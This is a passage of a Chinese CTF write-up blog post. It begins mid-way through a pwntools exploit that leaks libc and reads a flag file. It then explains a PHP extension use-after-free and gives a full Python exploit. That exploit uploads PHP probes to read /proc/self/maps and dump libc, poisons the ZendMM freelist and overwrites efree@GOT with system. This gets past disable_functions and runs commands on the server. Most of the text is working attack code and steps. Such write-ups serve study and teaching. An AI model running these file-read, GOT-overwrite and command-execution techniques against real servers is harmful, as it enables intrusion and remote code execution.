    io.recvuntil(b"ready")

    race_overflow(io, lane=0, length=8, ptr=elf.got["read"])
    read_addr = u64(dispatch_read(io, 8))
    libc_base = read_addr - libc.sym["read"]

    open_addr = libc_base + libc.sym["open"]
    readv_addr = libc_base + libc.sym["readv"]
    writev_addr = libc_base + libc.sym["writev"]

    log.info(f"read@libc = {hex(read_addr)}")
    log.info(f"libc base = {hex(libc_base)}")

    race_overflow(io, lane=1, length=16, ptr=TABLE_ADDR + 0x10)
    dispatch_write(io, p64(open_addr) + p64(readv_addr))

    race_overflow(io, lane=1, length=len(path_bytes), ptr=PATH_ADDR)
    dispatch_write(io, path_bytes)


    iov = b"".join(
        p64(BUF_ADDR + chunk_size * i) + p64(chunk_size)
        for i in range(3)
    )
    race_overflow(io, lane=1, length=len(iov), ptr=IOV_ADDR)
    dispatch_write(io, iov)

    out_iov = p64(BUF_ADDR) + p64(chunk_size)
    race_overflow(io, lane=1, length=len(out_iov), ptr=OUT_IOV_ADDR)
    dispatch_write(io, out_iov)

    race_overflow(io, lane=2, length=0, ptr=PATH_ADDR)
    menu(io, 6)
    io.recvuntil(b"[dispatch complete]")

    race_overflow(io, lane=3, length=IOV_ADDR, ptr=3)
    menu(io, 6)
    io.recvuntil(b"[dispatch complete]")

    race_overflow(io, lane=1, length=8, ptr=TABLE_ADDR + 0x8)
    dispatch_write(io, p64(writev_addr))

    race_overflow(io, lane=1, length=OUT_IOV_ADDR, ptr=1)
    menu(io, 6)
    io.recvuntil(b"[dispatch lane 1]\n")
    out = io.recvuntil(b"[dispatch complete]")
    return out


def main():
    parser = argparse.ArgumentParser(description="Astra-9 Throne Hazard exploit")
    parser.add_argument("--local", action="store_true", help="run locally with provided libc/ld")
    parser.add_argument("--tries", type=int, default=8, help="max reconnect attempts")
    parser.add_argument("--path", default="/flag", help="target file path")
    parser.add_argument("--chunk", type=lambda x: int(x, 0), default=0x80, help="read/write chunk size")
    args = parser.parse_args()

    path_bytes = args.path.encode()
    if not path_bytes.endswith(b"\x00"):
        path_bytes += b"\x00"

    for i in range(1, args.tries + 1):
        io = None
        try:
            log.info(f"attempt {i}/{args.tries}")
            io = start(args.local)
            out = exploit_once(io, path_bytes=path_bytes, chunk_size=args.chunk)

            m = FLAG_RE.search(out)
            if m:
                flag = m.group(0).decode(errors="ignore")
                print(f"[+] FLAG: {flag}")
                return

            print(f"[*] attempt {i}: no flag regex hit, raw head:")
            print(out[:200])
        except Exception as e:
            print(f"[!] attempt {i} failed: {repr(e)}")
        finally:
            if io is not None:
                try:
                    io.close()
                except Exception:
                    pass

    raise SystemExit("[-] exploit finished but no flag captured")


if __name__ == "__main__":
    main()
```



---



## 7.ph

题目的核心漏洞有两个：

1. UAF / Double Free
   - `delete(index)` 释放堆块后，没有把指针清空。
   - 这意味着后续仍可通过同一个下标继续访问已经释放的块，形成 UAF。
   - 再次 `delete` 还能形成 double free。
2. 索引检查不完整
   - `add/edit/delete` 对 `index` 只检查了 `index > 15`，没有检查负数。
   - 因此理论上可以通过负下标越界访问全局数组。



根据对 `vuln.so` 的静态分析，导出了如下接口：

- `add(index, size)`
- `edit(index, str)`
- `delete(index)`
- `test1()`
- `test2()`

1. add

逻辑大致为：

```
heap[index] = emalloc(size);
heap_size[index] = size;
```

即：

- 在 Zend 堆上申请一个指定大小的块；
- 指针保存在全局数组 `heap[index]`；
- 对应大小保存到 `heap_size[index]`。

2. edit

逻辑大致为：

```
if (len(data) <= heap_size[index]) {
    memcpy(heap[index], data, len(data));
}
```

即：

- 只要输入长度不超过记录大小，就会把数据拷贝到 `heap[index]` 指向的位置。
- 如果该块已经被释放，但指针没清空，那么这里就是典型的 **UAF 写**。

3. delete

逻辑大致为：

```
efree(heap[index]);
```

问题在于：

- 释放之后 没有执行 `heap[index] = NULL`；
- 也没有清空 `heap_size[index]`。

因此删除之后：

- 可以继续 `edit(index, ...)` 写入已释放块；
- 也可以再次 `delete(index)` 造成 double free。

题目给了一个 `php.ini`，禁用了不少危险函数，例如：

- `system`
- `exec`
- `shell_exec`
- `file_get_contents`
- 等等

限制 PHP层  调用这些函数。
而我们的利用发生在 C 扩展层

- `delete(index)` 最终会调用 `efree(...)`
- 如果我们把 `efree@GOT` 改成 `system`
- 那么执行 `delete(cmd_index)` 时，本质就变成：

```
system(heap[cmd_index]);
```

程序执行流被劫持到了 libc 的 `system()`，因此可以绕过 `disable_functions`。



虽然危险函数被禁了，但 `include` 仍然可用。
 于是可以上传一个 PHP 探针：

```
<?php include('/proc/self/maps'); ?>
```

访问后就能直接回显当前 PHP 进程的内存映射。

从 `/proc/self/maps` 中可以解析出：

- `/usr/local/lib/php/extensions/no-debug-non-zts-20210902/vuln.so`
- `/usr/lib/x86_64-linux-gnu/libc.so.6`

对应的映射起始地址，也就是两者的基址。



利用：

```
include('php://filter/read=convert.base64-encode/resource=/usr/lib/x86_64-linux-gnu/libc.so.6');
```

把目标机上的 `libc.so.6` 以 base64 的形式输出。

本地脚本再进行：

- base64 解码
- `readelf -sW libc.so.6 | grep system@@`

这样就能动态解析出：

- `system_offset`

于是：

```
system = libc_base + system_offset
```



根据 `vuln.so` 的源码，可以得到：

```
efree@GOT = vuln_base + 0x4050
```

1. `delete(index)` 必然会调用它

1. 参数刚好是我们可控的 `heap[index]`

所以只要我们把：

```
efree@GOT -> system
```

就能把：

```
delete(index)
```

变成：

```
system(heap[index])
```



攻击链：

题目中堆块由 `emalloc/efree` 管理，也就是 ZendMM。
 当一个 chunk 被 free 之后，它会进入对应 size class 的 freelist。

由于 `delete(index)` 后指针没清空，我们可以：

1. 申请一个 `0x40` 大小的块
2. 释放它
3. 再通过 `edit(index, ...)` 对这个已释放块进行 UAF 写
4. 把它的 freelist 指针改成目标地址 `efree@GOT`
5. 连续申请两次同尺寸块
6. 第二次分配时，就能把返回地址劫持到 `efree@GOT`
7. 随后写入 `system` 地址完成 GOT 覆写



假设使用如下下标：

- `cmd = 12`
- `uaf = 13`
- `a = 14`
- `b = 15`

步骤如下：

```
add(12, 0x80);
edit(12, "/readflag > /var/www/html/flag_out.txt\x00");
```

此时 `heap[12]` 里保存的是待执行命令。

```
add(13, 0x40);
delete(13);
edit(13, p64(efree_got));
```

这里的关键点是：

- `delete(13)` 后 chunk 已释放
- 但 `heap[13]` 没清空
- 因此 `edit(13, ...)` 实际是在写一个 freelist 节点
- 写入 `efree_got` 后，相当于把 freelist next 指向了 GOT 位置

```
add(14, 0x40);
add(15, 0x40);
```

- 第一次 `add(14, 0x40)` 取出原来的那个 free chunk
- 第二次 `add(15, 0x40)` 则会返回我们伪造的地址，即 `efree@GOT`

```
edit(15, p64(system));
```

于是：

```
efree@GOT = system
```

```
delete(12);
```

原本是：

```
efree(heap[12]);
```

现在变成：

```
system(heap[12]);
```

也就是：

```
/readflag > /var/www/html/flag_out.txt
```

### exp.py

```
import random
import re
import string
import sys
import time
import base64
import os
import subprocess
import tempfile

import requests

VULN_EFREE_GOT_OFF = 0x4050


def rand_name(prefix: str, ext: str = ".php") -> str:
    s = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    return f"{prefix}_{s}{ext}"


def bstr(bs: bytes) -> str:
    return "".join(f"\\x{b:02x}" for b in bs)


def p64(x: int) -> bytes:
    return x.to_bytes(8, "little")


def upload(sess: requests.Session, base: str, name: str, content: str) -> requests.Response:
    files = {"file": (name, content.encode(), "application/octet-stream")}
    return sess.post(f"{base}/index.php", files=files, timeout=10)


def fetch_text(sess: requests.Session, url: str) -> str:
    return sess.get(url, timeout=60).text


def parse_bases(maps_text: str):
    vuln_pat = re.compile(
        r"^([0-9a-f]+)-[0-9a-f]+\s+r--p\s+00000000\s+\S+\s+\S+\s+"
        r"/usr/local/lib/php/extensions/no-debug-non-zts-20210902/vuln\.so$",
        re.M,
    )
    libc_pat = re.compile(
        r"^([0-9a-f]+)-[0-9a-f]+\s+r--p\s+00000000\s+\S+\s+\S+\s+"
        r"/usr/lib/x86_64-linux-gnu/libc\.so\.6$",
        re.M,
    )

    mv = vuln_pat.search(maps_text)
    ml = libc_pat.search(maps_text)
    if not mv or not ml:
        raise RuntimeError("parse /proc/self/maps failed")
    return int(mv.group(1), 16), int(ml.group(1), 16)


def get_system_offset_from_libc(libc_blob: bytes) -> int:
    with tempfile.NamedTemporaryFile(prefix="ph_libc_", delete=False) as f:
        f.write(libc_blob)
        path = f.name

    try:
        out = subprocess.check_output(["readelf", "-sW", path], text=True)
    finally:
        os.unlink(path)

    m = re.search(r"\n\s*\d+:\s*([0-9a-f]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+system@@", out)
    if not m:
        raise RuntimeError("failed to find system@@ in dumped libc")
    return int(m.group(1), 16)


def build_exp_php(efree_got: int, system_addr: int, out_name: str, idx0: int, idx1: int, idx2: int, idx3: int) -> str:
    cmd = f"/readflag > /var/www/html/{out_name}\\x00"
    return f"""<?php
add({idx0}, 0x80);
edit({idx0}, \"{cmd}\");

add({idx1}, 0x40);
delete({idx1});
edit({idx1}, \"{bstr(p64(efree_got))}\");

add({idx2}, 0x40);
add({idx3}, 0x40);
edit({idx3}, \"{bstr(p64(system_addr))}\");

delete({idx0});
echo \"TRIGGERED\";
?>
"""


def run_once(base: str) -> str:
    sess = requests.Session()

    upload(sess, base, ".htaccess", "")

    maps_name = rand_name("maps")
    maps_php = "<?php include('/proc/self/maps'); ?>"
    r = upload(sess, base, maps_name, maps_php)
    if r.status_code != 200:
        raise RuntimeError(f"upload maps php failed, status={r.status_code}")

    maps = fetch_text(sess, f"{base}/{maps_name}")
    vuln_base, libc_base = parse_bases(maps)
    
    dump_name = rand_name("dump")
    dump_php = (
        "<?php include('php://filter/read=convert.base64-encode/"
        "resource=/usr/lib/x86_64-linux-gnu/libc.so.6'); ?>"
    )
    rr = upload(sess, base, dump_name, dump_php)
    if rr.status_code != 200:
        raise RuntimeError(f"upload libc dumper failed, status={rr.status_code}")
    libc_b64 = fetch_text(sess, f"{base}/{dump_name}")
    libc_blob = base64.b64decode(libc_b64)
    system_off = get_system_offset_from_libc(libc_blob)

    efree_got = vuln_base + VULN_EFREE_GOT_OFF
    system_addr = libc_base + system_off

    print(f"[+] vuln_base  = {hex(vuln_base)}")
    print(f"[+] libc_base  = {hex(libc_base)}")
    print(f"[+] system_off = {hex(system_off)}")
    print(f"[+] efree@got  = {hex(efree_got)}")
    print(f"[+] system     = {hex(system_addr)}")

    groups = [
        (12, 13, 14, 15),
        (8, 9, 10, 11),
        (4, 5, 6, 7),
        (0, 1, 2, 3),
    ]

    out_name = rand_name("flag", ext=".txt")

    for g in groups:
        idx0, idx1, idx2, idx3 = g
        exp_name = rand_name("exp")
        payload = build_exp_php(efree_got, system_addr, out_name, idx0, idx1, idx2, idx3)

        rr = upload(sess, base, exp_name, payload)
        if rr.status_code != 200:
            continue

        _ = fetch_text(sess, f"{base}/{exp_name}")
        time.sleep(0.2)
        out = fetch_text(sess, f"{base}/{out_name}")
        if "{" in out and "}" in out:
            print(f"[+] success with index group {g}")
            return out.strip()

    raise RuntimeError("exploit failed; try resetting instance and rerun")


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} http://host")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")
    flag = run_once(base)
    print(f"[FLAG] {flag}")


if __name__ == "__main__":
    main()
```



---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
